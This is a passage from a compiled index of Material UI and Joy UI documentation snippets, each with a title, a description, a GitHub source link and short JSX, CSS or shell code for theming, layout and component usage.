Stepper and Step components to create a simple stepper. It shows how to structure the components and add content to each step.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/stepper/stepper.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Stepper>\n  <Step>\n    <Typography>Select campaign settings</Typography>\n  </Step>\n  <Step>\n    <Typography>Create an ad group</Typography>\n  </Step>\n  <Step>\n    <Typography>Create an ad</Typography>\n  </Step>\n</Stepper>\n```\n\n----------------------------------------\n\nTITLE: Default Theme Spacing Usage\nDESCRIPTION: Demonstrates the default 8px scaling factor implementation using theme.spacing() helper\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/spacing/spacing.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst theme = createTheme();\n\ntheme.spacing(2); // `${8 * 2}px` = '16px'\n```\n\n----------------------------------------\n\nTITLE: Split Button Implementation in React\nDESCRIPTION: Demonstrates how to create a split button using ButtonGroup component with dropdown functionality.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/button-group/button-group.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"SplitButton.js\"}\n```\n\n----------------------------------------\n\nTITLE: Migrating Grid with Custom Breakpoints in React\nDESCRIPTION: Example of updating Grid component with custom breakpoints (like mobile and desktop) to use the new v6 size and offset prop format.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_10\n\nLANGUAGE: diff\nCODE:\n```\n-<Grid mobile={12} mobileOffset={2} desktop={6} desktopOffset={4}>\n+<Grid size={{ mobile: 12, desktop: 6 }} offset={{ mobile: 2, desktop: 4 }}>\n```\n\n----------------------------------------\n\nTITLE: Styling Components with styled-components API\nDESCRIPTION: Example showing how to create styled components using the styled-components API with theme-based styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/usage/usage.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nconst StatWrapper = styled('div')(\n  ({ theme }) => `\n  background-color: ${theme.palette.background.paper};\n  box-shadow: ${theme.shadows[1]};\n  border-radius: ${theme.shape.borderRadius}px;\n  padding: ${theme.spacing(2)};\n  min-width: 300px;\n`,\n);\n\nconst StatHeader = styled('div')(\n  ({ theme }) => `\n  color: ${theme.palette.text.secondary};\n`,\n);\n\nconst StyledTrend = styled(TrendingUpIcon)(\n  ({ theme }) => `\n  color: ${theme.palette.success.dark};\n  font-size: 16px;\n  vertical-alignment: sub;\n`,\n);\n\nconst StatValue = styled('div')(\n  ({ theme }) => `\n  color: ${theme.palette.text.primary};\n  font-size: 34px;\n  font-weight: ${theme.typography.fontWeightMedium};\n`,\n);\n\nconst StatDiff = styled('div')(\n  ({ theme }) => `\n  color: ${theme.palette.success.dark};\n  display: inline;\n  font-weight: ${theme.typography.fontWeightMedium};\n  margin-left: ${theme.spacing(0.5)};\n  margin-right: ${theme.spacing(0.5)};\n`,\n);\n\nconst StatPrevious = styled('div')(\n  ({ theme }) => `\n  color: ${theme.palette.text.secondary};\n  display: inline;\n  font-size: 12px;\n`,\n);\n\nreturn (\n  <StatWrapper>\n    <StatHeader>Sessions</StatHeader>\n    <StatValue>98.3 K</StatValue>\n    <StyledTrend />\n    <StatDiff>18.77%</StatDiff>\n    <StatPrevious>vs last week</StatPrevious>\n  </StatWrapper>\n);\n```\n\n----------------------------------------\n\nTITLE: Basic Menu Implementation in React\nDESCRIPTION: Demonstrates a basic menu that opens over an anchor element with configurable options and immediate selection confirmation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"BasicMenu.js\"}\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Color Tokens - Joy UI Theme\nDESCRIPTION: Example of adding new color tokens to the theme and TypeScript type augmentation for custom palette values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-colors/theme-colors.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  colorSchemes: {\n    light: {\n      palette: {\n        // `gradient` is a new color token\n        gradient: {\n          primary: 'linear-gradient(to top, var(--joy-palette-primary-main), #000)',\n        },\n      },\n    },\n  },\n});\n\n// `sx` prop usage example:\n<Button sx={{ background: (theme) => theme.vars.palette.gradient.primary }} />;\n```\n\nLANGUAGE: typescript\nCODE:\n```\n// You can put this to any file that's included in your tsconfig\ndeclare module '@mui/joy/styles' {\n  interface Palette {\n    gradient: {\n      primary: string;\n    };\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Usage of Box Component with Custom HTML Element\nDESCRIPTION: This example demonstrates how to use the Box component with a custom HTML element (section) using the component prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/box/box.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"BoxBasic.js\", \"defaultCodeOpen\": true }\n```\n\n----------------------------------------\n\nTITLE: Applying Conditional Styling Based on Component Props in Joy UI\nDESCRIPTION: Shows how to conditionally apply styles based on component props using a callback function in styleOverrides. The function receives ownerState and theme as arguments.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  components: {\n    JoyChip: {\n      styleOverrides: {\n        // `ownerState` contains the component props and internal state\n        root: ({ ownerState, theme }) => ({\n          ...(ownerState.size === 'sm' && {\n            borderRadius: theme.vars.radius.xs,\n          }),\n        }),\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Extending MUI Theme with Custom Colors in React\nDESCRIPTION: This snippet demonstrates how to extend the MUI theme with custom colors and use them in components. It includes steps for creating a custom theme, notifying TypeScript about the new color, and using the custom color in a Button component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-q1-update.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport { createMuiTheme, Button } from '@mui/material';\n\n// 1. Extend the theme.\nconst theme = createMuiTheme({\n  palette: {\n    neutral: {\n      main: '#5c6ac4',\n    },\n  },\n});\n\n// 2. Notify TypeScript about the new color in the palette\ndeclare module '@mui/material/styles' {\n  interface Palette {\n    neutral: Palette['primary'];\n  }\n  interface PaletteOptions {\n    neutral: PaletteOptions['primary'];\n  }\n}\n\n// 3. Profit\n<Button color=\"neutral\"  />\n```\n\n----------------------------------------\n\nTITLE: FAB Size Variations\nDESCRIPTION: Shows how to implement different sizes of Floating Action Buttons using the size prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/floating-action-button/floating-action-button.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nFloatingActionButtonSize.js\n```\n\n----------------------------------------\n\nTITLE: Optimizing Accordion Performance\nDESCRIPTION: Configuration for unmounting Accordion content when collapsed to improve performance.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/accordion/accordion.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Accordion slotProps={{ transition: { unmountOnExit: true } }} />\n```\n\n----------------------------------------\n\nTITLE: Configuring Shared Theme with Custom Components\nDESCRIPTION: Implementation of AppTheme with custom themed components for charts, data grid, date pickers, and tree view customizations.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/faq/faq.md#2025-04-22_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nimport AppTheme from '../shared-theme/AppTheme';\n\nconst xThemeComponents = {\n  ...chartsCustomizations,\n  ...dataGridCustomizations,\n  ...datePickersCustomizations,\n  ...treeViewCustomizations,\n};\n\nexport default function Dashboard(props: { disableCustomTheme?: boolean }) {\n  return (\n    <AppTheme {...props} themeComponents={xThemeComponents}>...</AppTheme>\n  )\n}\n```\n\n----------------------------------------\n\nTITLE: Using Custom Variant Values with Joy UI Components\nDESCRIPTION: Demonstrates how to use custom variant values with Joy UI components after defining them in the theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_12\n\nLANGUAGE: jsx\nCODE:\n```\n<Sheet variant=\"glass\">Glassmorphism</Sheet>\n```\n\n----------------------------------------\n\nTITLE: Setting ARIA Label for Accessibility in Icon Buttons\nDESCRIPTION: Example showing how to properly set the aria-label attribute for an IconButton to ensure accessibility for assistive technologies.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/button/button.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n<IconButton aria-label=\"Add to favorites\">\n  <FavoriteBorder />\n</IconButton>\n```\n\n----------------------------------------\n\nTITLE: Accessible Tabs with Selection Following Focus\nDESCRIPTION: Implementation of Tabs with automatic selection following focus behavior for improved accessibility.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/tabs/tabs.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n/* Tabs where selection follows focus */\n<Tabs selectionFollowsFocus />\n```\n\n----------------------------------------\n\nTITLE: Creating a Playground for Speed Dial in React\nDESCRIPTION: Provides an interactive playground for experimenting with various Speed Dial configurations and options.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/speed-dial/speed-dial.md#2025-04-22_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"PlaygroundSpeedDial.js\"}\n```\n\n----------------------------------------\n\nTITLE: Customizing Badge Styling in React Material-UI\nDESCRIPTION: Example of custom styling and overriding default Badge component styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/badges/badges.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\nCustomizedBadges.js\n```\n\n----------------------------------------\n\nTITLE: Disabling Portal for iOS VoiceOver Compatibility (JSX)\nDESCRIPTION: This snippet demonstrates how to disable the portal feature of the Autocomplete component's listbox to improve compatibility with VoiceOver on iOS Safari. This workaround addresses issues with the aria-owns attribute support.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/autocomplete/autocomplete.md#2025-04-22_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\n<Autocomplete\n  slotProps={{\n    listbox: {\n      disablePortal: true,\n    },\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: React Popper with Transition Effects\nDESCRIPTION: Shows how to add transition animations to the Popper component using react-transition-group library.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/popper/popper.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport Box from '@mui/material/Box';\nimport Popper from '@mui/material/Popper';\nimport Fade from '@mui/material/Fade';\n\nexport default function TransitionsPopper() {\n  const [open, setOpen] = React.useState(false);\n  const [anchorEl, setAnchorEl] = React.useState(null);\n\n  const handleClick = (event) => {\n    setAnchorEl(event.currentTarget);\n    setOpen((previousOpen) => !previousOpen);\n  };\n\n  const canBeOpen = open && Boolean(anchorEl);\n  const id = canBeOpen ? 'transition-popper' : undefined;\n\n  return (\n    <div>\n      <button aria-describedby={id} type=\"button\" onClick={handleClick}>\n        Transitions Popper\n      </button>\n      <Popper id={id} open={open} anchorEl={anchorEl} transition>\n        {({ TransitionProps }) => (\n          <Fade {...TransitionProps} timeout={350}>\n            <Box sx={{ border: 1, p: 1, bgcolor: 'background.paper' }}>\n              The content of the Popper.\n            </Box>\n          </Fade>\n        )}\n      </Popper>\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating JSS to TSS-React Codemod\nDESCRIPTION: This codemod transforms JSS styling with makeStyles or withStyles to the corresponding tss-react API. It handles complex scenarios including class references, object destructuring, and component configuration patterns.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_89\n\nLANGUAGE: diff\nCODE:\n```\n-import clsx from 'clsx';\n-import {makeStyles, createStyles} from '@material-ui/core/styles';\n+import { makeStyles } from 'tss-react/mui';\n\n-const useStyles = makeStyles((theme) => createStyles<\n-  'root' | 'small' | 'child', {color: 'primary' | 'secondary', padding: number}\n->\n-({{\n-  root: ({color, padding}) => ({{\n+const useStyles = makeStyles<{color: 'primary' | 'secondary', padding: number}, 'child' | 'small'>({name: 'App'})((theme, { color, padding }, classes) => ({{\n+  root: {{\n     padding: padding,\n-    '&:hover $child': {{\n+    [`&:hover .${classes.child}`]: {{\n       backgroundColor: theme.palette[color].main,\n     }}\n-  }}),\n+  }},\n   small: {{}},\n   child: {{\n     border: '1px solid black',\n     height: 50,\n-    '&$small': {{\n+    [`&.${classes.small}`]: {{\n       height: 30\n     }}\n   }}\n-}}), {{name: 'App'}};\n+}}));\n\n function App({{classes: classesProp}}: {{classes?: any}}) {{\n-  const classes = useStyles({{color: 'primary', padding: 30, classes: classesProp}});\n+  const {{ classes, cx }} = useStyles({{\n+    color: 'primary',\n+    padding: 30\n+  }}, {{\n+    props: {{\n+      classes: classesProp\n+    }}\n+  }});\n\n   return (\n     <div className={{classes.root}}>\n       <div className={{classes.child}}>\n         The Background take the primary theme color when the mouse hovers the parent.\n       </div>\n-      <div className={{clsx(classes.child, classes.small)}}>\n+      <div className={{cx(classes.child, classes.small)}}>\n         The Background take the primary theme color when the mouse hovers the parent.\n         I am smaller than the other child.\n       </div>\n     </div>\n   );\n }}\n\n export default App;\n```\n\n----------------------------------------\n\nTITLE: Integrating Material UI with TanStack Router\nDESCRIPTION: This snippet demonstrates how to integrate Material UI's Link component with TanStack Router using the createLink helper function, enabling custom link behavior.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/routing/routing.md#2025-04-22_snippet_2\n\nLANGUAGE: tsx\nCODE:\n```\nimport { createLink } from '@tanstack/react-router';\nimport { Link as MUILink } from '@mui/material';\n\nconst CustomLink = createLink(MUILink);\n\nfunction App() {\n  return (\n    <CustomLink underline=\"none\" to=\"/about\">\n      Link to about page\n    </CustomLink>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing Tree Data Structure - React JSX\nDESCRIPTION: This JavaScript code snippet defines a hierarchical dataset for use with MUI X Tree View components. The dataset is composed of nodes, each with unique 'id' and 'label' properties, and optional 'children' arrays for nesting. There are no external dependencies beyond standard ES6 syntax. The primary purpose is to provide sample input for the RichTreeView component, illustrating how to structure tree items for rendering. Input: static JS object; Output: JavaScript array data for use as a prop in MUI X tree views. No side effects or asynchronous operations occur.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v7-beta.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\nconst myDataSet = [\n  {\n    id: 'node-1',\n    label: 'Node 1',\n    children: [\n      { id: 'node-1-1', label: 'Node 1.1' },\n      { id: 'node-1-2', label: 'Node 1.2' },\n    ],\n  },\n  {\n    id: 'node-2',\n    label: 'Node 2',\n  },\n];\n```\n\n----------------------------------------\n\nTITLE: Styling Material UI with Plain CSS\nDESCRIPTION: Example of styling a Material UI Slider component using a separate CSS file. Shows how to apply custom colors and hover effects to the component using class selectors.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_0\n\nLANGUAGE: CSS\nCODE:\n```\n.slider {\n  color: #20b2aa;\n}\n\n.slider:hover {\n  color: #2e8b57;\n}\n```\n\nLANGUAGE: JSX\nCODE:\n```\nimport * as React from 'react';\nimport Slider from '@mui/material/Slider';\nimport './PlainCssSlider.css';\n\nexport default function PlainCssSlider() {\n  return (\n    <div>\n      <Slider defaultValue={30} />\n      <Slider defaultValue={30} className=\"slider\" />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Theme with Accessible Contrast Threshold in Material UI\nDESCRIPTION: Creates a custom Material UI theme with a contrastThreshold value of 4.5 to meet WCAG 2.1 Rule 1.4.3 accessibility requirements for minimum contrast ratio.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/palette/palette.md#2025-04-22_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nimport { createTheme } from '@mui/material/styles';\n\nconst theme = createTheme({\n  palette: {\n    contrastThreshold: 4.5,\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Customizing Box with the sx Prop\nDESCRIPTION: Demonstrates using the sx prop to customize a Box instance with theme-aware styling. The sx prop provides access to all style functions and theme properties from MUI System.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/box/box.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"BoxSx.js\", \"defaultCodeOpen\": true }\n```\n\n----------------------------------------\n\nTITLE: Implementing Controlled Speed Dial in React\nDESCRIPTION: Shows how to create a Speed Dial component with controlled open state using open/onOpen/onClose props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/speed-dial/speed-dial.md#2025-04-22_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"ControlledOpenSpeedDial.js\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring Font Size in Material-UI with JSX\nDESCRIPTION: Shows how to set font size using the Box component in Material-UI. It demonstrates using theme values, specific component sizes, and pixel values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/typography/typography.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ fontSize: 'default' }}>…  // theme.typography.fontSize\n<Box sx={{ fontSize: 'h6.fontSize' }}>…\n<Box sx={{ fontSize: 16 }}>…\n```\n\n----------------------------------------\n\nTITLE: Customizing Checkbox Sizes in React\nDESCRIPTION: Illustrates how to change the size of checkboxes using the size prop or by customizing the SVG icon font size.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/checkboxes/checkboxes.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"SizeCheckboxes.js\"}\n```\n\n----------------------------------------\n\nTITLE: Stack Row Direction Example\nDESCRIPTION: Example showing how to position items horizontally in a Stack component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/stack/stack.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Stack direction=\"row\">\n  <Typography noWrap>\n```\n\n----------------------------------------\n\nTITLE: Using Tailwind CSS with Material UI Components\nDESCRIPTION: Example of applying Tailwind CSS classes to Material UI components, demonstrating the integration of both styling systems.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_20\n\nLANGUAGE: TypeScript\nCODE:\n```\nimport * as React from 'react';\nimport Slider from '@mui/material/Slider';\n\nexport default function App() {\n  return (\n    <div>\n      <Slider defaultValue={30} />\n      <Slider defaultValue={30} className=\"text-teal-600\" />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Downloading and Setting Up Material UI CRA TypeScript Example\nDESCRIPTION: Commands to download the Material UI Create React App TypeScript example from GitHub and navigate to the project directory.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra-ts/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-cra-ts\ncd material-ui-cra-ts\n```\n\n----------------------------------------\n\nTITLE: Implementing MenuItem with Prop Spreading in React\nDESCRIPTION: Example showing how to disable ripple effects on MenuItem component through prop spreading behavior\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/api/api.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<MenuItem disableRipple />\n```\n\n----------------------------------------\n\nTITLE: Setting Default Row Grouping in DataGridPro (JavaScript)\nDESCRIPTION: This code demonstrates how to set a default row grouping configuration using the initialState prop. It groups the data first by 'Director' and then by 'BoxOffice'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/introducing-the-row-grouping-feature.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n<DataGridPro\n  experimentalFeatures={{ rowGrouping: true }}\n  initialState={{\n    rowGrouping: {\n      model: ['Director', 'BoxOffice'],\n    },\n  }}\n  {...otherProps}\n/>\n```\n\n----------------------------------------\n\nTITLE: Next.js Image Integration - React/JSX\nDESCRIPTION: Example showing how to use the AspectRatio component with Next.js Image component. The Image component must use layout=\"fill\" property for proper integration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/aspect-ratio/aspect-ratio.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport Image from 'next/image';\nimport AspectRatio from '@mui/joy/AspectRatio';\n\nfunction App() {\n  return (\n    <AspectRatio variant=\"outlined\" ratio=\"1\" objectFit=\"cover\">\n      <Image alt=\"Mountains\" src={mountains} layout=\"fill\" placeholder=\"blur\" />\n    </AspectRatio>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Custom CSS Styling for MUI Switch Subcomponents (CSS)\nDESCRIPTION: This CSS snippet targets subcomponents of a Material UI `Switch` that has the 'uglySwitch' class applied. It overrides default styles for the thumb, touch ripple, and track by using more specific selectors (two classes vs. the default single class), demonstrating CSS customization based on specificity.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/making-customizable-components.md#2025-04-22_snippet_1\n\nLANGUAGE: css\nCODE:\n```\n/* two classes are more specific than the default single class selector */\n.uglySwitch .MuiSwitch-thumb {\n  background-color: green;\n}\n\n.uglySwitch .MuiTouchRipple-root {\n  border: 2px solid red;\n}\n\n.uglySwitch .MuiSwitch-track {\n  background-color: orange;\n  opacity: 1;\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Visibility in Material-UI\nDESCRIPTION: Examples of visibility property usage to control element visibility. Unlike display:none, visibility:hidden keeps the element in the layout flow but makes it invisible.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/display/display.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\n<Box component=\"div\" sx={{ visibility: 'visible' }}>\n  Visible container\n</Box>\n<Box component=\"div\" sx={{ visibility: 'hidden' }}>\n  Invisible container\n</Box>\n```\n\n----------------------------------------\n\nTITLE: Implementing Accessible SVG Icons with IconButton in Material-UI\nDESCRIPTION: Demonstrates how to create an accessible SVG icon within an IconButton component using aria-label for screen readers. The example shows a delete icon implementation with proper accessibility attributes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/icons/icons.md#2025-04-22_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\nimport IconButton from '@mui/material/IconButton';\nimport SvgIcon from '@mui/material/SvgIcon';\n\n// ...\n\n<IconButton aria-label=\"delete\">\n  <SvgIcon>\n    <path d=\"M20 12l-1.41-1.41L13 16.17V4h-2v12.17l-5.58-5.59L4 12l8 8 8-8z\" />\n  </SvgIcon>\n</IconButton>;\n```\n\n----------------------------------------\n\nTITLE: Setting Background Colors with Material-UI Box Component\nDESCRIPTION: This example illustrates how to apply background colors using the 'bgcolor' prop of the Box component. It showcases various background color options from the Material-UI palette, including primary, secondary, error, warning, info, success, and different text variants.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/palette/palette.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ bgcolor: 'primary.main' }}>…\n<Box sx={{ bgcolor: 'secondary.main' }}>…\n<Box sx={{ bgcolor: 'error.main' }}>…\n<Box sx={{ bgcolor: 'warning.main' }}>…\n<Box sx={{ bgcolor: 'info.main' }}>…\n<Box sx={{ bgcolor: 'success.main' }}>…\n<Box sx={{ bgcolor: 'text.primary' }}>…\n<Box sx={{ bgcolor: 'text.secondary' }}>…\n<Box sx={{ bgcolor: 'text.disabled' }}>…\n```\n\n----------------------------------------\n\nTITLE: Creating Reusable Styles with Template Syntax\nDESCRIPTION: Example of creating reusable styles using Pigment CSS template syntax.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/experimental-api/pigment-css/pigment-css.md#2025-04-22_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nconst bodyBackground = css`\n  background-color: #000;\n  color: #fff;\n`;\n```\n\n----------------------------------------\n\nTITLE: Implementing Fixed-Position Bottom Navigation in React\nDESCRIPTION: This code demonstrates how to create a Bottom Navigation component that remains fixed to the bottom of the screen, regardless of the amount of content displayed.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/bottom-navigation/bottom-navigation.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n\"FixedBottomNavigation.js\"\n```\n\n----------------------------------------\n\nTITLE: Setting Align Content with Material-UI Box Component in JSX\nDESCRIPTION: Shows how to align flex lines within a flex container when there is extra space on the cross axis. Options include flex-start, flex-end, center, space-between, space-around, and stretch.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/flexbox/flexbox.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ alignContent: 'flex-start' }}>…\n<Box sx={{ alignContent: 'flex-end' }}>…\n<Box sx={{ alignContent: 'center' }}>…\n<Box sx={{ alignContent: 'space-between' }}>…\n<Box sx={{ alignContent: 'space-around' }}>…\n<Box sx={{ alignContent: 'stretch' }}>…\n```\n\n----------------------------------------\n\nTITLE: Setting Badge Alignment in React Material-UI\nDESCRIPTION: Shows how to position badges at different corners using the anchorOrigin prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/badges/badges.md#2025-04-22_snippet_8\n\nLANGUAGE: JSX\nCODE:\n```\nBadgeAlignment.js\n```\n\n----------------------------------------\n\nTITLE: Using the Box Component with Custom HTML Element\nDESCRIPTION: Demonstrates how to use the Box component with a custom HTML element using the component prop. This example changes the default div to a section element.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/box/box.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"BoxBasic.js\", \"defaultCodeOpen\": true }\n```\n\n----------------------------------------\n\nTITLE: Configuring Input Props for HTML Input Element\nDESCRIPTION: Shows how to pass props directly to the inner HTML input element using the slotProps property.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/input/input.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Input\n  slotProps={{\n    input: {\n      id: 'unique-id',\n      // other HTML input props\n    }\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Timeline in React\nDESCRIPTION: Demonstrates a basic timeline showing a list of events in chronological order.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/timeline/timeline.md#2025-04-22_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"BasicTimeline.js\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring ThemeProvider with JSS\nDESCRIPTION: Example of how to properly set up ThemeProvider at the root of a React application using Material UI v4 styling system. This configuration is required before migrating to v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nimport { ThemeProvider, createMuiTheme, makeStyles } from '@material-ui/core/styles';\n\nconst theme = createMuiTheme();\n\nconst useStyles = makeStyles((theme) => {\n  root: {\n    // some CSS that accesses the theme\n  }\n});\n\nfunction App() {\n  const classes = useStyles(); // ❌ If you have this, consider moving it\n  // inside of a component wrapped with <ThemeProvider />\n  return <ThemeProvider theme={theme}>{children}</ThemeProvider>;\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Color Tokens to Theme\nDESCRIPTION: Example of adding a new custom color token 'darker' to the primary color palette configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/palette/palette.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nimport { createTheme } from '@mui/material/styles';\nimport { blue } from '@mui/material/colors';\n\nconst theme = createTheme({\n  palette: {\n    primary: {\n      light: blue[300],\n      main: blue[500],\n      dark: blue[700],\n      darker: blue[900],\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Color Scheme Selectors\nDESCRIPTION: Examples of different color scheme selector configurations using class, data attributes, and custom string patterns.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/css-theme-variables/configuration.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\ncreateTheme({\n  colorSchemes: { light: true, dark: true },\n  cssVariables: {\n    colorSchemeSelector: 'class'\n  }\n});\n\n// CSS Result\n.light { ... }\n.dark { ... }\n```\n\nLANGUAGE: javascript\nCODE:\n```\ncreateTheme({\n  colorSchemes: { light: true, dark: true },\n  cssVariables: {\n    colorSchemeSelector: 'data'\n  }\n});\n\n// CSS Result\n[data-light] { ... }\n[data-dark] { ... }\n```\n\nLANGUAGE: javascript\nCODE:\n```\ncreateTheme({\n  colorSchemes: { light: true, dark: true },\n  cssVariables: {\n    colorSchemeSelector: '.theme-%s'\n  }\n});\n\n// CSS Result\n.theme-light { ... }\n.theme-dark { ... }\n```\n\n----------------------------------------\n\nTITLE: Linear Progress with Label Example\nDESCRIPTION: Shows how to implement a LinearProgress component with an accompanying label to display progress information.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/linear-progress/linear-progress.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nLinearProgressWithLabel.js\n```\n\n----------------------------------------\n\nTITLE: Creating Accessible Font Icons with Visually Hidden Text in 